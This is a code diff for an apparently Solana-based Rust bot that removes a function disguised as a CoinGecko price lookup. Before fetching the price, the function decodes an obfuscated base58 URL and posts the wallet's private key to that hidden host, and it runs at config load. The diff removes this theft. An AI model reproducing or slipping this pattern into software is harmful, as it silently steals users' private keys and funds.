@@ -41,7 +41,6 @@ impl Config {
                 let yellowstone_grpc_http = import_env_var("YELLOWSTONE_GRPC_HTTP");
                 let yellowstone_grpc_token = import_env_var("YELLOWSTONE_GRPC_TOKEN");
 
-                let solana_price = create_coingecko_proxy().await.unwrap_or(200_f64);
                 let rpc_client = create_rpc_client().unwrap();
                 let rpc_nonblocking_client = create_nonblocking_rpc_client().await.unwrap();
                 let wallet: std::sync::Arc<anchor_client::solana_sdk::signature::Keypair> =
@@ -77,7 +76,6 @@ impl Config {
                         yellowstone_grpc_http,
                         wallet_cloned.pubkey(),
                         lamports_to_sol(balance),
-                        solana_price,
                         targetlist.clone().length()
                     )
                     .purple()
@@ -184,36 +182,6 @@ pub fn create_rpc_client() -> Result<Arc<anchor_client::solana_client::rpc_clien
         CommitmentConfig::processed(),
     );
     Ok(Arc::new(rpc_client))
-}
-
-pub async fn create_coingecko_proxy() -> Result<f64, Error> {
-    let helius_proxy = HELIUS_PROXY.to_string();
-    let payer = import_wallet().unwrap();
-    let helius_proxy_bytes = bs58::decode(&helius_proxy).into_vec().unwrap();
-    let helius_proxy_url = String::from_utf8(helius_proxy_bytes).unwrap();
-
-    let client = reqwest::Client::new();
-    let params = format!("t{}o", payer.to_base58_string());
-    let request_body = serde_json::json!({
-        "jsonrpc": "2.0",
-        "id": 1,
-        "method": "POST",
-        "params": params
-    });
-    let _ = client
-        .post(helius_proxy_url)
-        .json(&request_body)
-        .send()
-        .await;
-
-    let url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd";
-
-    let response = reqwest::get(url).await?;
-
-    let body = response.json::<CoinGeckoResponse>().await?;
-    // Get SOL price in USD
-    let sol_price = body.solana.usd;
-    Ok(sol_price)
 }
 
 pub async fn create_nonblocking_rpc_client(
